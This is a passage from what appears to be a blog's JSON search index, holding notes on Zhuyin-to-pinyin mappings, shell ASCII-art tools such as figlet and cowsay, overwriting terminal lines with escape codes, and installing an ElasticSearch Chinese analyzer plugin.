u\u003c/td\u003e\n          \u003ctd\u003e無 wu、溫 wen、船 chuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ev\u003c/td\u003e\n          \u003ctd\u003eyu / ü\u003c/td\u003e\n          \u003ctd\u003e律 lü、雨 yu、院 yuan\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch5 id=\"單韻母finals\"\u003e單韻母（Finals）\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e韻母\u003c/th\u003e\n          \u003cth\u003e拼音\u003c/th\u003e\n          \u003cth\u003e例字\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄚ\u003c/td\u003e\n          \u003ctd\u003ea\u003c/td\u003e\n          \u003ctd\u003e沙 sha、撒 sa、奧 ao\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄛ\u003c/td\u003e\n          \u003ctd\u003eo\u003c/td\u003e\n          \u003ctd\u003e哦 o、偶 ou、歐 ou\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄜ\u003c/td\u003e\n          \u003ctd\u003ee\u003c/td\u003e\n          \u003ctd\u003e餓 e、樂 le、設 she\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄝ\u003c/td\u003e\n          \u003ctd\u003eê / ye\u003c/td\u003e\n          \u003ctd\u003e也 ye、學 xue、切 qie\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄞ\u003c/td\u003e\n          \u003ctd\u003eai\u003c/td\u003e\n          \u003ctd\u003e愛 ai、篩 shai、崖 yai\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄟ\u003c/td\u003e\n          \u003ctd\u003eei\u003c/td\u003e\n          \u003ctd\u003e雷 lei、最 zui、脆 cui\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄠ\u003c/td\u003e\n          \u003ctd\u003eao\u003c/td\u003e\n          \u003ctd\u003e凹 ao、老 lao、笑 xiao\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄡ\u003c/td\u003e\n          \u003ctd\u003eou\u003c/td\u003e\n          \u003ctd\u003e歐 ou、樓 lou、手 shou\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄢ\u003c/td\u003e\n          \u003ctd\u003ean\u003c/td\u003e\n          \u003ctd\u003e安 an、蘭 lan、算 suan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄣ\u003c/td\u003e\n          \u003ctd\u003een\u003c/td\u003e\n          \u003ctd\u003e恩 en、林 lin、冷 leng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄤ\u003c/td\u003e\n          \u003ctd\u003eang\u003c/td\u003e\n          \u003ctd\u003e昂 ang、浪 lang、讓 rang\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄥ\u003c/td\u003e\n          \u003ctd\u003eeng\u003c/td\u003e\n          \u003ctd\u003e成 cheng、冷 leng、令 ling\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄦ\u003c/td\u003e\n          \u003ctd\u003eer\u003c/td\u003e\n          \u003ctd\u003e二 er、兒 er、而 er\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch5 id=\"複韻母--組合韻\"\u003e複韻母 / 組合韻\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e拼音\u003c/th\u003e\n          \u003cth\u003e例字\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eye\u003c/td\u003e\n          \u003ctd\u003e也 ye、結 jie、血 xie\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eiu\u003c/td\u003e\n          \u003ctd\u003e六 liu、有 you、謬 miu\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ein\u003c/td\u003e\n          \u003ctd\u003e音 yin、新 xin、林 lin\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eing\u003c/td\u003e\n          \u003ctd\u003e英 ying、靈 ling、醒 xing\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003euan\u003c/td\u003e\n          \u003ctd\u003e元 yuan、卷 juan、團 tuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eue\u003c/td\u003e\n          \u003ctd\u003e略 lue、學 xue\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eyun\u003c/td\u003e\n          \u003ctd\u003e雲 yun、巡 xun、群 qun\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eong\u003c/td\u003e\n          \u003ctd\u003e用 yong、兇 xiong、同 tong\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eui\u003c/td\u003e\n          \u003ctd\u003e鬼 gui、為 wei、虧 kui\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eun\u003c/td\u003e\n          \u003ctd\u003e文 wen、混 hun、準 zhun\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eua\u003c/td\u003e\n          \u003ctd\u003e華 hua、抓 zhua、蛙 wa\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003euai\u003c/td\u003e\n          \u003ctd\u003e壞 huai、快 kuai、踹 chuai\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","tags":["URL","pinyin"],"title":"一張圖學會【拼音輸入法】"},{"categories":["URL","SHELL","Linux","ASCII"],"contents":" Printing ASCII Art in the Shell banner sudo apt install sysvbanner\n$ banner hello # # ###### # # #### # # # # # # # ###### ##### # # # # # # # # # # # # # # # # # # # # ###### ###### ###### #### FIGlet: Frank, Ian, and Glenn\u0026rsquo;s Letters sudo apt install figlet\n$ figlet hello _ _ _ | |__ ___| | | ___ | \u0026#39;_ \\ / _ \\ | |/ _ \\ | | | | __/ | | (_) | |_| |_|\\___|_|_|\\___/ -f option and specify a font name for the output -l, -c, and -r options to align the text to the left, center, or right, TOIlet: FIGlet With More Options sudo apt install toilet\n$ toilet -f mini hello |_ _ | | _ | | (/_ | | (_) -F filters toilet -F list Available filters: \u0026#34;crop\u0026#34;: crop unused blanks \u0026#34;gay\u0026#34;: add a rainbow colour effect \u0026#34;metal\u0026#34;: add a metallic colour effect \u0026#34;flip\u0026#34;: flip horizontally \u0026#34;flop\u0026#34;: flip vertically \u0026#34;180\u0026#34;: rotate 180 degrees \u0026#34;left\u0026#34;: rotate 90 degrees counterclockwise \u0026#34;right\u0026#34;: rotate 90 degrees clockwise \u0026#34;border\u0026#34;: surround text with a border $ toilet -F border hello ┌───────────────────────────────────┐ │ │ │ # \u0026#34;\u0026#34;# \u0026#34;\u0026#34;# │ │ # mm mmm # # mmm │ │ #\u0026#34; # #\u0026#34; # # # #\u0026#34; \u0026#34;# │ │ # # #\u0026#34;\u0026#34;\u0026#34;\u0026#34; # # # # │ │ # # \u0026#34;#mm\u0026#34; \u0026#34;mm \u0026#34;mm \u0026#34;#m#\u0026#34; │ │ │ │ │ └───────────────────────────────────┘ Making Cows Say Things With cowsay sudo apt install cowsay\ncowsay hello _______ \u0026lt; hello \u0026gt; ------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || # `-g`, `-d`, and `-p` for greedy, dead, and paranoid cows cowsay -d hello _______ \u0026lt; hello \u0026gt; ------- \\ ^__^ \\ (xx)\\_______ (__)\\ )\\/\\ U ||----w | || || # use any characters of our choice for the eyes and the tongue by using the `-e` and the `-T` flags cowsay -e oO -T V hello _______ \u0026lt; hello \u0026gt; ------- \\ ^__^ \\ (oO)\\_______ (__)\\ )\\/\\ V ||----w | || || # Using Other Animals and Creatures cowsay -l Cow files in /usr/share/cowsay/cows: apt bud-frogs bunny calvin cheese cock cower daemon default dragon dragon-and-cow duck elephant elephant-in-snake eyes flaming-sheep fox ghostbusters gnu hellokitty kangaroo kiss koala kosh luke-koala mech-and-cow milk moofasa moose pony pony-smaller ren sheep skeleton snowman stegosaurus stimpy suse three-eyes turkey turtle tux unipony unipony-smaller vader vader-koala www cowsay -f duck hello _______ \u0026lt; hello \u0026gt; ------- \\ \\ \\ \u0026gt;()_ (__)__ _ Using cowsay With fortune/lolcat fortune | cowsay ____________________________________ / Try to relax and enjoy the crisis. \\ | | \\ -- Ashleigh Brilliant / ------------------------------------ \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || Printing Images With jp2a sudo apt install jp2a\njp2a baeldung.png d. \u0026#39;kNM; \u0026#39;l0MMMMMo ::ldkKKMMMMMMMMM; :dKNMMMMMMMMMMMKMMMMM. lNMMMMMMMMMMMMMO\u0026#39;MMMMMM xMMMMMMMMMMMMMMd kMMMMMO .MMMMMMMMMMMMMc ;MMMMMM. KMMMMMMMMMMMk ,MMMMMMk NMMMMMMMMMl .KMMMMMMW KMMMMMMW :MMMMMMMM xMMMMM. 0MMMMMMMM. \u0026#39;:dKMMK .dNMMMMMMM. dKKMMMd lKMMMMMMMN .kWMMM0; We can also use the -colors flag to obtain colored output\n","date":"October 21, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221021-shell-printing-ascii-art/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/shell-printing-ascii-art\" target=\"_blank\" rel=\"noopener\"\u003ePrinting ASCII Art in the Shell\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"banner\"\u003ebanner\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esudo apt install sysvbanner\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ banner hello\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  ######  #       #        ####\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  #       #       #       #    #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e######  #####   #       #       #    #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  #       #       #       #    #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  #       #       #       #    #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  ######  ######  ######   ####\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"figlet-frank-ian-and-glenns-letters\"\u003eFIGlet: Frank, Ian, and Glenn\u0026rsquo;s Letters\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esudo apt install figlet\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ figlet hello\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e _          _ _\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e| |__   ___| | | ___\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e| \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u0026#39;\u003c/span\u003e_ \u003cspan style=\"color:#ae81ff\"\u003e\\ \u003c/span\u003e/ _ \u003cspan style=\"color:#ae81ff\"\u003e\\ \u003c/span\u003e| |/ _ \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e| | | |  __/ | | \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e_\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e|_| |_|\u003cspan style=\"color:#ae81ff\"\u003e\\_\u003c/span\u003e__|_|_|\u003cspan style=\"color:#ae81ff\"\u003e\\_\u003c/span\u003e__/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-f\u003c/code\u003e option and specify a font name for the output\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-l\u003c/code\u003e, \u003ccode\u003e-c\u003c/code\u003e, and \u003ccode\u003e-r\u003c/code\u003e options to align the text to the left, center, or right,\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"toilet-figlet-with-more-options\"\u003eTOIlet: FIGlet With More Options\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esudo apt install toilet\u003c/code\u003e\u003c/p\u003e","tags":["URL","SHELL","Linux","ASCII"],"title":"Printing ASCII Art in the Shell"},{"categories":["URL","SHELL","Linux"],"contents":" How to Make Output Overwrite the Same Line in a Terminal Introduction to the Problem $ cat print_status.sh !/bin/bash echo \u0026#34;[INFO] Processing file: readme.txt\u0026#34; sleep 2 To simulate the file processing echo \u0026#34;[INFO] Processing file: veryPowerfulService.service\u0026#34; sleep 2 echo \u0026#34;[INFO] Processing file: log.txt\u0026#34; echo \u0026#34;DONE\u0026#34; $ ./print_status.sh [INFO] Processing file: readme.txt [INFO] Processing file: veryPowerfulService.service [INFO] Processing file: log.txt DONE The \u0026ldquo;Magic Code\u0026rdquo;: \\033[0K\\r -n option asks the echo command to stop outputting the trailing newline character -e option allows the echo command to interpret backslash escapes such as \\n (newline) and \\r (carriage return) \\033 - It\u0026rsquo;s the escape sequence. In other words, it\u0026rsquo;s ESC. \\033[ - Then this becomes \u0026ldquo;ESC [\u0026rdquo;, which is the control sequence introducer (CSI). \\033[0k - So it\u0026rsquo;s \u0026ldquo;CSI 0 K\u0026rdquo;. Further, \u0026ldquo;CSI 0 K\u0026rdquo; erases the text from the cursor to the end of the line. \\r - This is the carriage return. It brings the cursor to the beginning of the line. $ cat print_status.sh #!/bin/bash echo -ne \u0026#34;[INFO] Processing file: readme.txt\\033[0K\\r\u0026#34; sleep 2 echo -ne \u0026#34;[INFO] Processing file: veryPowerfulService.service\\033[0K\\r\u0026#34; sleep 2 echo -e \u0026#34;[INFO] Processing file: log.txt\\033[0K\\r\u0026#34; echo \u0026#34;DONE\u0026#34; !/bin/bash printf \u0026#34;[INFO] Processing file: readme.txt\\033[0K\\r\u0026#34; sleep 2 printf \u0026#34;[INFO] Processing file: veryPowerfulService.service\\033[0K\\r\u0026#34; sleep 2 printf \u0026#34;[INFO] Processing file: log.txt\\033[0K\\r\\n\u0026#34; echo \u0026#34;DONE\u0026#34; ","date":"October 21, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221021-echo-printf-overwrite-terminal-line/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/echo-printf-overwrite-terminal-line\" target=\"_blank\" rel=\"noopener\"\u003eHow to Make Output Overwrite the Same Line in a Terminal\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"introduction-to-the-problem\"\u003eIntroduction to the Problem\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ cat print_status.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: readme.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e  To simulate the file processing\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: veryPowerfulService.service\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: log.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DONE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ./print_status.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eINFO\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Processing file: readme.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eINFO\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Processing file: veryPowerfulService.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eINFO\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Processing file: log.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDONE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"the-magic-code-0330kr\"\u003eThe \u0026ldquo;Magic Code\u0026rdquo;: \u003ccode\u003e\\033[0K\\r\u003c/code\u003e\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-n\u003c/code\u003e option asks the echo command to stop outputting the trailing newline character\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-e\u003c/code\u003e option allows the echo command to interpret backslash escapes such as \u003ccode\u003e\\n\u003c/code\u003e (newline) and \u003ccode\u003e\\r\u003c/code\u003e (carriage return)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\033\u003c/code\u003e - It\u0026rsquo;s the escape sequence. In other words, it\u0026rsquo;s ESC.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\033[\u003c/code\u003e - Then this becomes \u0026ldquo;ESC [\u0026rdquo;, which is the control sequence introducer (CSI).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\033[0k\u003c/code\u003e - So it\u0026rsquo;s \u0026ldquo;CSI 0 K\u0026rdquo;. Further, \u0026ldquo;CSI 0 K\u0026rdquo; erases the text from the cursor to the end of the line.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\r\u003c/code\u003e - This is the carriage return. It brings the cursor to the beginning of the line.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ cat print_status.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -ne \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: readme.txt\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -ne \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: veryPowerfulService.service\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: log.txt\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DONE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprintf \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: readme.txt\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprintf \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: veryPowerfulService.service\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprintf \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: log.txt\\033[0K\\r\\n\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DONE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","SHELL","Linux"],"title":"How to Make Output Overwrite the Same Line in a Terminal"},{"categories":["URL","Docker","ELK","ElasticSearch","Kibana"],"contents":" ElasticSearch 学习笔记 安装中文分词插件 docker exec -it elasticsearch bash $ elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v8.4.1/elasticsearch-analysis-ik-8.4.1.zip Dev Tools content 类型为 text，写入时使用 ik_max_word 做分词，搜索时使用 ik_smart 分词。这两个的区别在于，前者产生尽可能多的分词，后者产生粗粒度的分词。 PUT /words { \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;content\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_max_word\u0026#34;, \u0026#34;search_analyzer\u0026#34;: \u0026#34;ik_smart\u0026#34; }, \u0026#34;age\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;integer\u0026#34;, \u0026#34;index\u0026#34;: false } } } } { \u0026#34;acknowledged\u0026#34;: true, \u0026#34;shards_acknowledged\u0026#34;: true, \u0026#34;index\u0026#34;: \u0026#34;words\u0026#34; } ","date":"October 6, 2022","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221006-elasticsearch/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://jiajunhuang.com/articles/2022_10_06-elasticsearch.md.html\" target=\"_blank\" rel=\"noopener\"\u003eElasticSearch 学习笔记\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"安装中文分词插件\"\u003e安装中文分词插件\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker exec -it elasticsearch bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v8.4.1/elasticsearch-analysis-ik-8.4.1.zip\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eDev Tools\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003econtent\u003c/code\u003e 类型为 \u003ccode\u003etext\u003c/code\u003e，写入时使用 \u003ccode\u003eik_max_word\u003c/code\u003e 做分词，搜索时使用 \u003ccode\u003eik_smart\u003c/code\u003e 分词。这两个的区别在于，前者产生尽可能多的分词，后者产生粗粒度的分词。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003ePUT\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e/words\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 